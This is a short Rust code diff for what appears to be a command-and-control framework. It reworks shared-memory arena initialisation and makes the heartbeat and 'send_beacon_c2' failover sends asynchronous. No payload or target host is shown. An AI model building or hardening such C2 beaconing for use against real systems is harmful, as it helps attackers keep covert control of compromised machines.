@@ -45,24 +45,11 @@ impl HiveChamber {
         let mapping = arena_mgr::connect_to_arena()?;
         let ptr = mapping.as_ptr();
 
-        if mapping.is_owned()
-            && !arena::verify_arena(ptr) {
-                arena::init_arena(ptr);
-                let tb = telemetry::TelemetryBuffer::open(ptr);
-                tb.init();
-                info!("Created new colmena arena (shared memory)");
-            }
-
-        let mut retries = 0;
-        while !arena::verify_arena(ptr) && retries < 30 {
-            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
-            retries += 1;
-        }
         if !arena::verify_arena(ptr) {
-            return Err(std::io::Error::new(
-                std::io::ErrorKind::NotFound,
-                "Arena not initialized after 3s timeout",
-            ));
+            arena::init_arena(ptr);
+            let tb = telemetry::TelemetryBuffer::open(ptr);
+            tb.init();
+            info!("Initialized colmena arena (shared memory)");
         }
 
         let id_bytes = identity.id().as_bytes().to_owned();
@@ -285,7 +272,7 @@ impl HiveChamber {
         let sent_via_failover = {
             let mut guard = self.ensure_failover();
             if let Some(ref mut director) = *guard {
-                let results = director.send_with_failover(beacon.as_bytes());
+                let results = director.send_with_failover(beacon.as_bytes()).await;
                 let success = results.iter().any(|r| r.success);
                 if success {
                     info!("SMOKE: heartbeat sent via failover director");
@@ -587,7 +574,7 @@ impl HiveChamber {
     pub async fn send_beacon_c2(&self, data: &[u8]) -> bool {
         let mut guard = self.ensure_failover();
         if let Some(ref mut director) = *guard {
-            let results = director.send_with_failover(data);
+            let results = director.send_with_failover(data).await;
             let success = results.iter().any(|r| r.success);
             if success {
                 info!("C2: beacon delivered via failover ({} channels tried)", results.len());
